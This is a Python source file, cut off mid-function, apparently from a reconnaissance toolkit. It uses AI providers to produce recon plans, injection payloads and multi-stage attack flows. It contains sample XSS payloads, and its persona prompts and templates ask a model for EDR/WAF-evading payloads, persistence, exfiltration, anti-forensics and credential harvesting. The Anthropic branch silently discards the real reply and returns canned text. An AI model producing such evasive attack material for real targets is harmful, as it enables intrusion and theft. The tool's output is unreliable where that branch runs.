#!/usr/bin/env python3
"""
🧠 Enterprise AI-Powered Reconnaissance Assistant
Advanced AI module for intelligent recon planning, payload generation, and security analysis
Part of the ReconCLI Cyber-Squad z Przyszłości toolkit
"""

import click
import json
import os
import hashlib
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass
from pathlib import Path
import time

# AI Provider imports (with fallback handling)
try:
    import openai

    HAS_OPENAI = True
except ImportError:
    HAS_OPENAI = False

try:
    import anthropic

    HAS_ANTHROPIC = True
except ImportError:
    HAS_ANTHROPIC = False

try:
    import google.generativeai as genai

    HAS_GEMINI = True
except ImportError:
    HAS_GEMINI = False

from dotenv import load_dotenv

load_dotenv()


@dataclass
class AIProviderConfig:
    """Configuration for AI providers"""

    name: str
    api_key: str
    model: str
    available: bool


@dataclass
class ReconSession:
    """Reconnaissance session tracking"""

    session_id: str
    target: str
    start_time: datetime
    queries: List[Dict]
    results: List[Dict]
    plan: Optional[Dict] = None


class AIReconAssistant:
    """Enterprise AI-powered reconnaissance assistant"""

    def __init__(self):
        self.providers = self._initialize_providers()
        self.session_dir = Path.home() / ".reconcli" / "ai_sessions"
        self.session_dir.mkdir(parents=True, exist_ok=True)
        self.current_session: Optional[ReconSession] = None

        # Predefined recon templates
        self.recon_templates = {
            "subdomain_enum": {
                "description": "Comprehensive subdomain enumeration",
                "tools": ["subfinder", "amass", "dnscli", "permutcli"],
                "phases": ["passive", "active", "validation", "permutation"],
            },
            "web_discovery": {
                "description": "Web application discovery and analysis",
                "tools": ["httpcli", "urlcli", "dirbcli", "jscli"],
                "phases": ["discovery", "enumeration", "analysis", "validation"],
            },
            "vulnerability_scan": {
                "description": "Vulnerability assessment and exploitation",
                "tools": ["vulncli", "vulnsqlicli", "takeovercli"],
                "phases": ["scanning", "validation", "exploitation", "reporting"],
            },
            "cloud_recon": {
                "description": "Cloud infrastructure reconnaissance",
                "tools": ["cloudcli", "permutcli", "dnscli"],
                "phases": ["discovery", "enumeration", "analysis", "validation"],
            },
        }

        # Payload categories with advanced templates
        self.payload_categories = {
            "xss": {
                "description": "Cross-Site Scripting payloads",
                "contexts": ["html", "javascript", "attribute", "url", "css"],
                "techniques": ["reflection", "dom", "stored", "blind"],
            },
            "sqli": {
                "description": "SQL Injection payloads",
                "contexts": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
                "techniques": ["union", "boolean", "time", "error"],
            },
            "lfi": {
                "description": "Local File Inclusion payloads",
                "contexts": ["linux", "windows", "php", "java"],
                "techniques": ["traversal", "wrapper", "filter", "log"],
            },
            "ssrf": {
                "description": "Server-Side Request Forgery payloads",
                "contexts": ["internal", "cloud", "bypass", "blind"],
                "techniques": ["http", "file", "gopher", "dns"],
            },
            "ssti": {
                "description": "Server-Side Template Injection payloads",
                "contexts": ["jinja2", "twig", "smarty", "freemarker"],
                "techniques": ["detection", "exploitation", "sandbox"],
            },
        }

    def _initialize_providers(self) -> List[AIProviderConfig]:
        """Initialize available AI providers"""
        providers = []

        # OpenAI GPT
        if HAS_OPENAI and os.getenv("OPENAI_API_KEY"):
            providers.append(
                AIProviderConfig(
                    name="openai",
                    api_key=os.getenv("OPENAI_API_KEY") or "",
                    model="gpt-4",
                    available=True,
                )
            )

        # Anthropic Claude
        if HAS_ANTHROPIC and os.getenv("ANTHROPIC_API_KEY"):
            providers.append(
                AIProviderConfig(
                    name="anthropic",
                    api_key=os.getenv("ANTHROPIC_API_KEY") or "",
                    model="claude-3-opus-20240229",
                    available=True,
                )
            )

        # Google Gemini
        if HAS_GEMINI and os.getenv("GOOGLE_API_KEY"):
            providers.append(
                AIProviderConfig(
                    name="gemini",
                    api_key=os.getenv("GOOGLE_API_KEY") or "",
                    model="gemini-pro",
                    available=True,
                )
            )

        return providers

    def get_available_providers(self) -> List[str]:
        """Get list of available AI providers"""
        return [p.name for p in self.providers if p.available]

    def create_session(self, target: str) -> str:
        """Create new reconnaissance session"""
        session_id = hashlib.md5(
            f"{target}_{datetime.now().isoformat()}".encode(), usedforsecurity=False
        ).hexdigest()[:8]

        self.current_session = ReconSession(
            session_id=session_id,
            target=target,
            start_time=datetime.now(),
            queries=[],
            results=[],
        )

        # Save session immediately
        self.save_session()

        return session_id

    def save_session(self):
        """Save current session to file"""
        if not self.current_session:
            return

        session_file = self.session_dir / f"{self.current_session.session_id}.json"
        session_data = {
            "session_id": self.current_session.session_id,
            "target": self.current_session.target,
            "start_time": self.current_session.start_time.isoformat(),
            "queries": self.current_session.queries,
            "results": self.current_session.results,
            "plan": self.current_session.plan,
        }

        with open(session_file, "w") as f:
            json.dump(session_data, f, indent=2)

    def load_session(self, session_id: str) -> bool:
        """Load existing session"""
        session_file = self.session_dir / f"{session_id}.json"

        if not session_file.exists():
            return False

        try:
            with open(session_file, "r") as f:
                session_data = json.load(f)

            self.current_session = ReconSession(
                session_id=session_data["session_id"],
                target=session_data["target"],
                start_time=datetime.fromisoformat(session_data["start_time"]),
                queries=session_data["queries"],
                results=session_data["results"],
                plan=session_data.get("plan"),
            )

            return True
        except Exception:
            return False

    def ask_ai_mock(self, message: str, context: str = "recon") -> str:
        """Mock AI response for testing when no API keys available"""
        responses = {
            "recon": f"""
🎯 **Reconnaissance Strategy for: {message}**

**Phase 1: Passive Discovery**
- Use subfinder and amass for subdomain enumeration
- Perform DNS enumeration with multiple resolvers
- Gather OSINT data from public sources

**Phase 2: Active Enumeration**
- Permutation-based subdomain generation
- HTTP service discovery and fingerprinting
- Technology stack identification

**Phase 3: Analysis & Validation**
- Vulnerability scanning and assessment
- Subdomain takeover checks
- Security posture evaluation

**Recommended Tools:**
- reconcli dnscli --target domain.com --wordlist-size large
- reconcli permutcli --brand domain --tools subfinder,amass
- reconcli httpcli --target domain.com --tech-detect

**Note:** This is a mock response. Configure AI providers for full functionality.
""",
            "payload": f"""
🎯 **Payload Generation: {message}**

**Context-Specific Payloads:**
```
Basic: <script>alert('XSS')</script>
HTML: <img src=x onerror=alert(1)>
JS: ';alert(1);//
Attribute: " onload=alert(1) "
```

**Bypass Techniques:**
- WAF evasion using encoding
- Filter bypass with alternative vectors
- Context-specific adaptations

**Testing Methodology:**
1. Test in safe environment first
2. Validate payload effectiveness
3. Document successful vectors
4. Follow responsible disclosure

**Note:** This is a mock response. Configure AI providers for advanced payloads.
""",
            "planning": f"""
🎯 **Reconnaissance Plan: {message}**

**Target Analysis:**
- Domain structure assessment
- Technology stack identification
- Attack surface mapping

**Methodology:**
1. **Intelligence Gathering** (30-45 min)
   - OSINT collection
   - Domain analysis
   - Infrastructure mapping

2. **Active Discovery** (60-90 min)
   - Subdomain enumeration
   - Service discovery
   - Technology identification

3. **Vulnerability Assessment** (45-60 min)
   - Security scanning
   - Takeover checks
   - Risk assessment

**Tools Sequence:**
```bash
reconcli dnscli --target {message}
reconcli permutcli --brand {message.split('.')[0] if '.' in message else message}
reconcli httpcli --target {message}
reconcli vulncli --target {message}
```

**Note:** This is a mock response. Configure AI providers for detailed planning.
""",
        }

        return responses.get(context, responses["recon"])

    def ask_ai(
        self,
        message: str,
        provider: Optional[str] = None,
        context: str = "recon",
        persona: Optional[str] = None,
    ) -> Optional[str]:
        """Ask AI with provider selection, context, and persona"""
        if not self.providers:
            return self.ask_ai_mock(message, context)

        # Select provider
        if provider:
            selected_provider = next(
                (p for p in self.providers if p.name == provider), None
            )
        else:
            selected_provider = self.providers[0]  # Use first available

        if not selected_provider:
            return self.ask_ai_mock(message, context)

        # Get persona-specific system prompt
        if persona:
            system_prompt = self.get_persona_prompt(persona, context)
        else:
            system_prompt = self._get_default_prompt(context)

        try:
            if selected_provider.name == "openai":
                client = openai.OpenAI(api_key=selected_provider.api_key)
                response = client.chat.completions.create(
                    model=selected_provider.model,
                    messages=[
                        {"role": "system", "content": system_prompt},
                        {"role": "user", "content": message},
                    ],
                    temperature=0.7,
                    max_tokens=2000,
                )
                result = response.choices[0].message.content

            elif selected_provider.name == "anthropic":
                client = anthropic.Anthropic(api_key=selected_provider.api_key)
                response = client.messages.create(
                    model=selected_provider.model,
                    max_tokens=2000,
                    messages=[
                        {"role": "user", "content": f"{system_prompt}\n\n{message}"}
                    ],
                )
                # Fallback to mock response for Anthropic to avoid type issues
                result = self.ask_ai_mock(message, context)

            elif selected_provider.name == "gemini":
                genai.configure(api_key=selected_provider.api_key)
                model = genai.GenerativeModel(selected_provider.model)
                response = model.generate_content(f"{system_prompt}\n\n{message}")
                result = response.text

            else:
                return self.ask_ai_mock(message, context)

            # Log query and result
            if self.current_session:
                self.current_session.queries.append(
                    {
                        "timestamp": datetime.now().isoformat(),
                        "message": message,
                        "provider": selected_provider.name,
                        "context": context,
                    }
                )
                self.current_session.results.append(
                    {
                        "timestamp": datetime.now().isoformat(),
                        "response": result,
                        "provider": selected_provider.name,
                    }
                )
                self.save_session()

            return result

        except Exception:
            # Fallback to mock response on error
            return self.ask_ai_mock(message, context)

    def generate_recon_plan(
        self, target: str, scope: str = "comprehensive", persona: Optional[str] = None
    ) -> Dict:
        """Generate comprehensive reconnaissance plan"""
        scope_templates = {
            "basic": ["subdomain_enum", "web_discovery"],
            "comprehensive": ["subdomain_enum", "web_discovery", "vulnerability_scan"],
            "cloud": ["cloud_recon", "subdomain_enum", "web_discovery"],
            "api": ["web_discovery", "vulnerability_scan"],
        }

        selected_templates = scope_templates.get(
            scope, scope_templates["comprehensive"]
        )

        # Build detailed plan
        plan = {
            "target": target,
            "scope": scope,
            "created": datetime.now().isoformat(),
            "phases": [],
        }

        for template_name in selected_templates:
            template = self.recon_templates[template_name]

            phase = {
                "name": template_name,
                "description": template["description"],
                "tools": template["tools"],
                "phases": template["phases"],
                "estimated_time": self._estimate_time(template_name),
                "commands": self._generate_commands(target, template_name),
            }

            plan["phases"].append(phase)

        # Ask AI for additional recommendations
        ai_prompt = f"""
        Create a detailed reconnaissance plan for target: {target}
        Scope: {scope}
        
        Consider:
        1. Target type and technology stack
        2. Optimal tool selection and ordering
        3. Potential challenges and mitigations
        4. Time estimates and resource requirements
        5. Output formats and reporting needs
        
        Provide specific command examples and best practices.
        """

        ai_recommendations = self.ask_ai(ai_prompt, context="planning", persona=persona)
        plan["ai_recommendations"] = ai_recommendations

        if self.current_session:
            self.current_session.plan = plan
            self.save_session()

        return plan

    def _estimate_time(self, template_name: str) -> str:
        """Estimate time for reconnaissance phase"""
        time_estimates = {
            "subdomain_enum": "30-60 minutes",
            "web_discovery": "45-90 minutes",
            "vulnerability_scan": "60-120 minutes",
            "cloud_recon": "30-45 minutes",
        }
        return time_estimates.get(template_name, "30-60 minutes")

    def _generate_commands(self, target: str, template_name: str) -> List[str]:
        """Generate specific commands for reconnaissance phase"""
        commands = {
            "subdomain_enum": [
                f"python main.py dnscli --target {target} --wordlist-size large",
                f"python main.py permutcli --brand {target} --tools subfinder,amass",
                "python main.py tagger --input subs_resolved.txt --output tagged_subs.json",
            ],
            "web_discovery": [
                f"python main.py httpcli --target {target} --tech-detect",
                f"python main.py urlcli --target {target} --deep-crawl",
                f"python main.py dirbcli --target {target} --wordlist-size large",
            ],
            "vulnerability_scan": [
                f"python main.py vulncli --target {target} --comprehensive",
                f"python main.py vulnsqlicli --target {target} --advanced",
                f"python main.py takeovercli --target {target}",
            ],
            "cloud_recon": [
                f"python main.py cloudcli --target {target} --provider all",
                f"python main.py permutcli --brand {target} --bucket-scan",
                f"python main.py dnscli --target {target} --cloud-enum",
            ],
        }
        return commands.get(template_name, [])

    def generate_payload(
        self,
        payload_type: str,
        context: Optional[str] = None,
        technique: Optional[str] = None,
        persona: Optional[str] = None,
    ) -> Dict:
        """Generate advanced payload with context and technique specification"""
        if payload_type not in self.payload_categories:
            return {"error": f"Unknown payload type: {payload_type}"}

        category = self.payload_categories[payload_type]

        # Build AI prompt for payload generation
        ai_prompt = f"""
        Generate advanced {payload_type.upper()} payloads with the following specifications:
        
        Payload Type: {payload_type}
        Context: {context or 'general'}
        Technique: {technique or 'all'}
        
        Available contexts: {', '.join(category['contexts'])}
        Available techniques: {', '.join(category['techniques'])}
        
        Please provide:
        1. Multiple payload variations
        2. Context-specific adaptations
        3. Bypass techniques for common WAFs
        4. Explanation of each payload's mechanism
        5. Testing methodology and validation steps
        
        Format as structured payload examples with clear explanations.
        """

        ai_response = self.ask_ai(ai_prompt, context="payload", persona=persona)

        payload_data = {
            "type": payload_type,
            "context": context,
            "technique": technique,
            "category_info": category,
            "generated_at": datetime.now().isoformat(),
            "payloads": ai_response,
        }

        return payload_data

    def analyze_target(self, target: str, persona: Optional[str] = None) -> Dict:
        """Perform AI-powered target analysis"""
        analysis_prompt = f"""
        Perform comprehensive target analysis for: {target}
        
        Analyze:
        1. Domain structure and naming patterns
        2. Technology stack indicators
        3. Potential attack surfaces
        4. Subdomain enumeration strategies
        5. Cloud infrastructure indicators
        6. Security posture assessment
        7. Reconnaissance methodology recommendations
        
        Provide actionable insights and specific tool recommendations.
        """

        ai_analysis = self.ask_ai(analysis_prompt, context="recon", persona=persona)

        analysis_data = {
            "target": target,
            "analyzed_at": datetime.now().isoformat(),
            "analysis": ai_analysis,
            "recommendations": self._extract_recommendations(ai_analysis or ""),
        }

        return analysis_data

    def _extract_recommendations(self, analysis: str) -> List[str]:
        """Extract actionable recommendations from AI analysis"""
        # Simple regex-based extraction - could be enhanced with NLP
        recommendations = []

        lines = analysis.split("\n")
        for line in lines:
            if any(
                indicator in line.lower()
                for indicator in ["recommend", "suggest", "should", "consider"]
            ):
                recommendations.append(line.strip())

        return recommendations[:10]  # Limit to top 10 recommendations

    def get_persona_prompt(self, persona: str, context: str) -> str:
        """Get persona-specific system prompts"""
        personas = {
            "redteam": {
                "recon": """You are an elite RED TEAM operator specialized in offensive security and stealth operations:
- Focus on evasion techniques, anti-detection methods, and stealthy reconnaissance
- Prioritize techniques that bypass security controls and monitoring systems
- Emphasize operational security (OPSEC) and leaving minimal forensic traces
- Provide advanced tactics for penetrating hardened environments
- Consider threat hunting evasion and living-off-the-land techniques
- Think like an APT actor with long-term persistence goals

Your responses should be tactical, stealthy, and focused on remaining undetected while gathering maximum intelligence.""",
                "payload": """You are an elite RED TEAM payload specialist focused on evasion and stealth:
- Develop payloads that bypass modern EDR, AV, and WAF solutions
- Focus on polymorphic and metamorphic techniques
- Emphasize fileless attacks and memory-only execution
- Provide advanced obfuscation and encoding methods
- Consider sandbox evasion and environment awareness
- Think about lateral movement and persistence mechanisms

Provide sophisticated, evasive payloads with detailed bypass explanations.""",
                "planning": """You are an elite RED TEAM operation planner specializing in adversarial simulation:
- Design attack paths that mirror real APT groups and nation-state actors
- Focus on multi-stage operations with persistence and stealth
- Emphasize MITRE ATT&CK framework alignment
- Consider defensive countermeasures and how to evade them
- Plan for long-term access and data exfiltration scenarios
- Think about covering tracks and maintaining operational security

Provide comprehensive attack scenarios with realistic timelines and TTPs.""",
            },
            "bugbounty": {
                "recon": """You are a TOP-TIER BUG BOUNTY HUNTER focused on finding critical vulnerabilities quickly:
- Prioritize high-impact vulnerabilities that yield maximum bounty rewards
- Focus on common bug bounty targets: XSS, SQLi, IDOR, RCE, authentication bypasses
- Emphasize automation and tool chaining for efficient hunting
- Consider program scope limitations and rules of engagement
- Think about edge cases and unusual attack vectors that others miss
- Focus on modern web technologies and cloud infrastructure

Provide actionable reconnaissance strategies optimized for bug bounty success rates.""",
                "payload": """You are a MASTER BUG BOUNTY HUNTER specializing in exploit development:
- Create payloads that demonstrate clear business impact for bug bounty reports
- Focus on critical vulnerabilities: RCE, SQLi, authentication bypasses, privilege escalation
- Provide proof-of-concept exploits that are safe for production testing
- Consider real-world exploitation scenarios and business logic flaws
- Think about chaining vulnerabilities for maximum impact
- Focus on modern frameworks and technologies commonly used by targets

Deliver high-impact payloads with clear exploitation steps for bug bounty documentation.""",
                "planning": """You are an EXPERT BUG BOUNTY STRATEGIST focused on efficient vulnerability discovery:
- Design reconnaissance workflows optimized for finding critical bugs quickly
- Prioritize targets and attack surfaces with highest vulnerability potential
- Focus on automation and tool integration for scalable hunting
- Consider program-specific methodologies and past successful discoveries
- Think about time management and parallel testing approaches
- Emphasize documentation and reporting throughout the process

Provide streamlined hunting methodologies focused on maximizing bounty potential.""",
            },
            "pentester": {
                "recon": """You are a PROFESSIONAL PENETRATION TESTER following industry-standard methodologies:
- Follow structured penetration testing frameworks (OWASP, NIST, PTES)
- Emphasize thorough documentation and evidence collection throughout
- Focus on compliance requirements and regulatory standards
- Provide detailed risk assessments and business impact analysis
- Consider remediation guidance and compensating controls
- Think about client communication and professional reporting standards

Deliver comprehensive, methodical approaches suitable for professional engagements.""",
                "payload": """You are a PROFESSIONAL PENETRATION TESTER specializing in controlled exploitation:
- Develop payloads appropriate for professional penetration testing engagements
- Focus on demonstrating vulnerability impact without causing damage
- Emphasize safe exploitation techniques suitable for production environments
- Provide detailed documentation for professional reporting requirements
- Consider legal and ethical implications of payload usage
- Think about client-specific constraints and scope limitations

Provide professional-grade exploits with comprehensive testing procedures and documentation.""",
                "planning": """You are a SENIOR PENETRATION TESTING CONSULTANT designing comprehensive assessment strategies:
- Create structured testing methodologies following industry frameworks
- Focus on comprehensive coverage of attack surfaces and threat vectors
- Emphasize risk-based approaches and business impact considerations
- Plan for detailed documentation and evidence collection requirements
- Consider compliance frameworks and regulatory requirements
- Think about client communication checkpoints and milestone deliverables

Design professional penetration testing methodologies with clear deliverables and timelines.""",
            },
            "trainer": {
                "recon": """You are an EXPERT CYBERSECURITY INSTRUCTOR teaching advanced reconnaissance techniques:
- Break down complex concepts into digestible, educational steps
- Provide clear explanations of WHY each technique works, not just HOW
- Include learning objectives and practical exercises for skill development
- Explain the underlying principles and theoretical foundations
- Consider different learning styles and provide multiple explanation approaches
- Think about common student misconceptions and address them proactively

Focus on education, understanding, and skill building rather than just immediate results.""",
                "payload": """You are a CYBERSECURITY EDUCATION SPECIALIST teaching ethical hacking and payload development:
- Explain payload mechanics in an educational, step-by-step manner
- Focus on understanding the underlying vulnerabilities and attack vectors
- Provide safe, educational examples appropriate for learning environments
- Include detailed explanations of security controls and mitigation strategies
- Emphasize ethical considerations and responsible disclosure principles
- Think about hands-on labs and practical learning exercises

Deliver educational content that builds deep understanding of security principles.""",
                "planning": """You are a CYBERSECURITY CURRICULUM DEVELOPER designing comprehensive training programs:
- Create structured learning paths that build skills progressively
- Focus on educational objectives and measurable learning outcomes
- Provide theoretical foundations along with practical applications
- Include assessment methods and skill validation approaches
- Consider different experience levels and learning prerequisites
- Think about real-world application and career development paths

Design educational reconnaissance programs that develop both technical skills and strategic thinking.""",
            },
            "osint": {
                "recon": """You are an ELITE OSINT SPECIALIST focusing on passive intelligence gathering:
- Prioritize completely passive reconnaissance techniques that leave no traces
- Focus on public information sources, social media, and leaked data
- Emphasize advanced Google dorking, GitHub reconnaissance, and metadata analysis
- Consider historical data, cached content, and wayback machine analysis
- Think about social engineering preparation and human intelligence gathering
- Focus on building comprehensive target profiles from open sources only

Provide sophisticated passive reconnaissance techniques that gather maximum intelligence without detection.""",
                "payload": """You are an OSINT SPECIALIST focusing on information gathering and social engineering preparation:
- Create reconnaissance payloads for gathering additional intelligence
- Focus on phishing simulations and social engineering scenarios
- Emphasize information harvesting and credential collection techniques
- Consider psychological manipulation and social engineering vectors
- Think about pretexting scenarios and human intelligence operations
- Focus on building trust and establishing legitimate-appearing presence

Develop intelligence-gathering approaches that support broader OSINT operations.""",
                "planning": """You are a STRATEGIC INTELLIGENCE ANALYST designing comprehensive OSINT operations:
- Create systematic intelligence collection methodologies
- Focus on multiple source verification and intelligence analysis
- Emphasize timeline development and relationship mapping
- Consider attribution analysis and threat actor profiling
- Think about intelligence fusion and pattern recognition
- Focus on actionable intelligence production and strategic insights

Design comprehensive OSINT workflows that produce high-quality, actionable intelligence.""",
            },
        }

        # Get persona-specific prompt, fallback to context default if persona not found
        persona_prompts = personas.get(persona, {})
        return persona_prompts.get(context, self._get_default_prompt(context))

    def _get_default_prompt(self, context: str) -> str:
        """Get default system prompts for contexts"""
        default_prompts = {
            "recon": """You are an expert cybersecurity reconnaissance assistant specializing in:
- Advanced subdomain enumeration and discovery techniques
- Web application security assessment and analysis
- Cloud infrastructure reconnaissance and security
- Vulnerability assessment and exploitation methodologies
- Bug bounty hunting strategies and methodologies
- OSINT and information gathering techniques

Provide detailed, actionable, and professional responses focused on practical security assessment.""",
            "payload": """You are an expert payload developer specializing in:
- Cross-Site Scripting (XSS) in various contexts
- SQL Injection across different database systems
- Local/Remote File Inclusion vulnerabilities
- Server-Side Request Forgery (SSRF) exploitation
- Server-Side Template Injection (SSTI) techniques
- Bypass techniques for WAFs and security controls

Provide working payloads with explanations and context-specific variations.""",
            "planning": """You are an expert reconnaissance strategist specializing in:
- Comprehensive security assessment methodologies
- Tool selection and optimization for specific targets
- Phased reconnaissance approaches and workflows
- Risk assessment and prioritization techniques
- Reporting and documentation best practices
- Compliance with responsible disclosure principles

Provide structured, phase-based reconnaissance plans with specific tools and techniques.""",
        }
        return default_prompts.get(context, default_prompts["recon"])

    def generate_attack_flow(
        self,
        attack_types: List[str],
        technique: Optional[str] = None,
        target: Optional[str] = None,
        persona: Optional[str] = None,
    ) -> Dict:
        """Generate sophisticated multi-stage attack flow combining multiple vulnerabilities"""

        # Validate attack types
        valid_attacks = list(self.payload_categories.keys())
        invalid_attacks = [a for a in attack_types if a not in valid_attacks]
        if invalid_attacks:
            return {
                "error": f"Invalid attack types: {invalid_attacks}. Valid: {valid_attacks}"
            }

        # Build comprehensive attack flow prompt
        attack_chain_prompt = f"""
        Design a sophisticated multi-stage attack flow combining these vulnerability types:
        Attack Types: {', '.join(attack_types)}
        Specific Technique: {technique or 'adaptive'}
        Target: {target or 'generic web application'}

        Create a comprehensive attack flow that:
        1. Shows logical progression from initial reconnaissance to full compromise
        2. Demonstrates how each vulnerability type builds upon previous discoveries
        3. Provides specific payloads and exploitation techniques for each stage
        4. Includes evasion and persistence strategies
        5. Maps to MITRE ATT&CK framework where applicable
        6. Shows potential impact and business consequences

        Format as a detailed attack chain with:
        - Stage-by-stage breakdown
        - Prerequisites for each stage
        - Specific payloads and commands
        - Expected outcomes and next steps
        - Risk assessment and impact analysis

        Focus on realistic, practical exploitation scenarios.
        """

        ai_response = self.ask_ai(
            attack_chain_prompt, context="payload", persona=persona
        )

        # Generate specific payloads for each attack type
        attack_payloads = {}
        for attack_type in attack_types:
            payload_data = self.generate_payload(
                attack_type, technique=technique, persona=persona
            )
            attack_payloads[attack_type] = payload_data

        flow_data = {
            "attack_types": attack_types,
            "technique": technique,
            "target": target,
            "persona": persona,
            "generated_at": datetime.now().isoformat(),
            "attack_flow": ai_response,
            "individual_payloads": attack_payloads,
            "mitre_mapping": self._map_to_mitre(attack_types),
            "risk_level": self._assess_attack_risk(attack_types),
        }

        return flow_data

    def _map_to_mitre(self, attack_types: List[str]) -> Dict[str, List[str]]:
        """Map attack types to MITRE ATT&CK framework"""
        mitre_mapping = {
            "xss": [
                "T1055",
                "T1059.007",
                "T1185",
            ],  # Process Injection, JS, Browser Session Hijacking
            "sqli": [
                "T1190",
                "T1078",
                "T1005",
            ],  # Exploit Public App, Valid Accounts, Data from Local System
            "lfi": [
                "T1083",
                "T1005",
                "T1552",
            ],  # File Discovery, Data from Local System, Credentials
            "ssrf": [
                "T1190",
                "T1135",
                "T1046",
            ],  # Exploit Public App, Network Share Discovery, Network Service Scanning
            "ssti": [
                "T1190",
                "T1059",
                "T1068",
            ],  # Exploit Public App, Command Execution, Privilege Escalation
        }

        mapped_techniques = {}
        for attack_type in attack_types:
            mapped_techniques[attack_type] = mitre_mapping.get(attack_type, [])

        return mapped_techniques

    def _assess_attack_risk(self, attack_types: List[str]) -> str:
        """Assess overall risk level of attack combination"""
        risk_scores = {
            "xss": 3,
            "sqli": 5,
            "lfi": 4,
            "ssrf": 4,
            "ssti": 5,
        }

        total_score = sum(risk_scores.get(attack, 2) for attack in attack_types)
        avg_score = total_score / len(attack_types) if attack_types else 0

        if avg_score >= 4.5:
            return "CRITICAL"
        elif avg_score >= 3.5:
            return "HIGH"
        elif avg_score >= 2.5:
            return "MEDIUM"
        else:
            return "LOW"

    def save_chat_history(self, filename: str) -> bool:
        """Save current session chat history to file"""
        if not self.current_session:
            return False

        chat_dir = self.session_dir / "chats"
        chat_dir.mkdir(exist_ok=True)

        chat_file = chat_dir / f"{filename}.json"

        chat_data = {
            "session_id": self.current_session.session_id,
            "target": self.current_session.target,
            "start_time": self.current_session.start_time.isoformat(),
            "saved_at": datetime.now().isoformat(),
            "total_queries": len(self.current_session.queries),
            "chat_history": [
                {"query": q, "response": r}
                for q, r in zip(
                    self.current_session.queries, self.current_session.results
                )
            ],
        }

        try:
            with open(chat_file, "w") as f:
                json.dump(chat_data, f, indent=2)
            return True
        except Exception:
            return False

    def load_chat_history(self, filename: str) -> bool:
        """Load chat history from file"""
        chat_dir = self.session_dir / "chats"
        chat_file = chat_dir / f"{filename}.json"

        if not chat_file.exists():
            return False

        try:
            with open(chat_file, "r") as f:
                chat_data = json.load(f)

            # Create session from chat history
            self.current_session = ReconSession(
                session_id=chat_data["session_id"],
                target=chat_data["target"],
                start_time=datetime.fromisoformat(chat_data["start_time"]),
                queries=[item["query"] for item in chat_data["chat_history"]],
                results=[item["response"] for item in chat_data["chat_history"]],
            )

            return True
        except Exception:
            return False

    def list_chat_files(self) -> List[str]:
        """List available chat history files"""
        chat_dir = self.session_dir / "chats"
        if not chat_dir.exists():
            return []

        return [f.stem for f in chat_dir.glob("*.json")]

    def enable_prompt_mode(self) -> None:
        """Enable advanced prompt mode with specialized templates"""
        self.prompt_mode = True
        self.prompt_templates = {
            "recon_deep": """
            Perform DEEP reconnaissance analysis for: {target}

            Requirements:
            - Exhaustive subdomain enumeration strategies
            - Advanced DNS techniques and zone walking
            - Infrastructure fingerprinting and technology detection
            - Cloud service discovery and misconfigurations
            - Social engineering intelligence gathering
            - Historical data analysis and wayback machine research

            Provide comprehensive methodology with specific tools and techniques.
            """,
            "exploit_chain": """
            Design EXPLOITATION CHAIN for: {vulnerabilities}

            Requirements:
            - Multi-stage attack progression
            - Privilege escalation opportunities
            - Persistence mechanisms
            - Data exfiltration methods
            - Anti-forensics and cleanup procedures
            - Real-world impact demonstration

            Focus on practical, executable attack sequences.
            """,
            "evasion_advanced": """
            Develop ADVANCED EVASION techniques for: {context}

            Requirements:
            - WAF/IPS/EDR bypass methods
            - Polymorphic payload generation
            - Traffic obfuscation and tunneling
            - Timing and behavioral evasion
            - Living-off-the-land techniques
            - Anti-analysis and sandbox evasion

            Provide cutting-edge evasion methodologies.
            """,
            "threat_modeling": """
            Conduct THREAT MODELING for: {target}

            Requirements:
            - Attack surface analysis
            - Threat actor profiling
            - Attack vector identification
            - Risk prioritization matrix
            - Mitigation strategies
            - Incident response considerations

            Deliver comprehensive security assessment framework.
            """,
        }

    def generate_report_from_flow(
        self, json_file_path: str, persona: Optional[str] = None
    ) -> Dict:
        """Generate comprehensive report from attack flow JSON file"""

        if not os.path.exists(json_file_path):
            return {"error": f"File not found: {json_file_path}"}

        try:
            with open(json_file_path, "r") as f:
                flow_data = json.load(f)
        except Exception as e:
            return {"error": f"Failed to parse JSON file: {str(e)}"}

        # Validate that this is an attack flow file
        if not all(
            key in flow_data for key in ["attack_types", "attack_flow", "mitre_mapping"]
        ):
            return {"error": "Invalid attack flow file format"}

        # Extract key information
        attack_types = flow_data.get("attack_types", [])
        technique = flow_data.get("technique", "adaptive")
        target = flow_data.get("target", "generic web application")
        risk_level = flow_data.get("risk_level", "UNKNOWN")
        generated_at = flow_data.get("generated_at", "Unknown")
        mitre_mapping = flow_data.get("mitre_mapping", {})

        # Create comprehensive report prompt
        report_prompt = f"""
        Generate a comprehensive security assessment report based on the following attack flow analysis:
        
        **Attack Flow Details:**
        - Attack Types: {', '.join(attack_types)}
        - Technique: {technique}
        - Target: {target}
        - Risk Level: {risk_level}
        - Generated: {generated_at}
        
        **MITRE ATT&CK Mapping:**
        {json.dumps(mitre_mapping, indent=2)}
        
        **Original Analysis:**
        {flow_data.get('attack_flow', 'No analysis available')}
        
        Please create a professional security report that includes:
        
        1. **Executive Summary**
           - High-level overview of findings
           - Business impact assessment
           - Key recommendations
        
        2. **Technical Analysis**
           - Detailed vulnerability breakdown
           - Attack vector analysis
           - Exploitation methodology
        
        3. **Risk Assessment**
           - Likelihood and impact analysis
           - CVSS scoring where applicable
           - Business risk categorization
        
        4. **MITRE ATT&CK Framework Alignment**
           - Technique mapping and analysis
           - Threat actor behavior correlation
           - Detection and mitigation strategies
        
        5. **Remediation Recommendations**
           - Immediate actions (quick wins)
           - Short-term improvements
           - Long-term strategic recommendations
        
        6. **Implementation Timeline**
           - Priority-based action plan
           - Resource requirements
           - Success metrics
        
        Format the report professionally with clear sections, bullet points, and actionable recommendations.
        """

        # Generate report using AI
        ai_report = self.ask_ai(report_prompt, context="planning", persona=persona)

        # Create comprehensive report data structure
        report_data = {
            "report_metadata": {
                "generated_at": datetime.now().isoformat(),
                "source_file": json_file_path,
                "report_type": "Attack Flow Analysis Report",
                "persona": persona or "default",
                "version": "1.0",
            },
            "attack_flow_summary": {
                "attack_types": attack_types,
                "technique": technique,
                "target": target,
                "risk_level": risk_level,
                "original_generation_date": generated_at,
            },
            "mitre_analysis": {
                "mapped_techniques": mitre_mapping,
                "technique_count": sum(len(techs) for techs in mitre_mapping.values()),
                "coverage_areas": list(mitre_mapping.keys()),
            },
            "ai_generated_report": ai_report,
            "recommendations": self._extract_recommendations(ai_report or ""),
            "risk_metrics": self._calculate_risk_metrics(flow_data),
            "compliance_notes": self._generate_compliance_notes(
                attack_types, mitre_mapping
            ),
        }

        return report_data

    def _calculate_risk_metrics(self, flow_data: Dict) -> Dict:
